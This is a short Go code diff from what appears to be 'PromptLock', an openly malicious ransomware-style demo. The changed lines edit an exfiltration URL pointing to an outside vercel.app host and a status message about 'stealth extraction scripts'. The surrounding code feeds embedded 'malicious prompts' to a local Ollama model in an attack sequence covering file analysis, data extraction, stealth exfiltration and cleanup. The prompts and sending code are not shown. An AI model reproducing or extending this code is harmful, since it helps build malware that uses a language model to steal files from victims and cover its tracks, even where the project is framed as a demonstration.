@@ -14,7 +14,7 @@ import (
 var config = map[string]string{
 	"ollama_endpoint": "http://localhost:11434/api/generate",
 	"model_name":      "llama3.2:1b",
-	"exfiltration_url": "https://promptlock-ransomware-demo.vercel.app/api/data",
+	"exfiltration_url": "https://prompt-lock-demo.vercel.app/api/exfiltrate",
 }
 
 // Malicious prompts embedded in the executable
@@ -300,7 +300,7 @@ func main() {
 	time.Sleep(500 * time.Millisecond)
 
 	if ollamaActive {
-		fmt.Println("\nGenerating data extraction scripts...")
+		fmt.Println("\nGenerating stealth extraction scripts...")
 		
 		// Send each malicious prompt in attack order
 		promptOrder := []string{"file_analysis", "data_extraction", "stealth_exfiltration", "cleanup"}
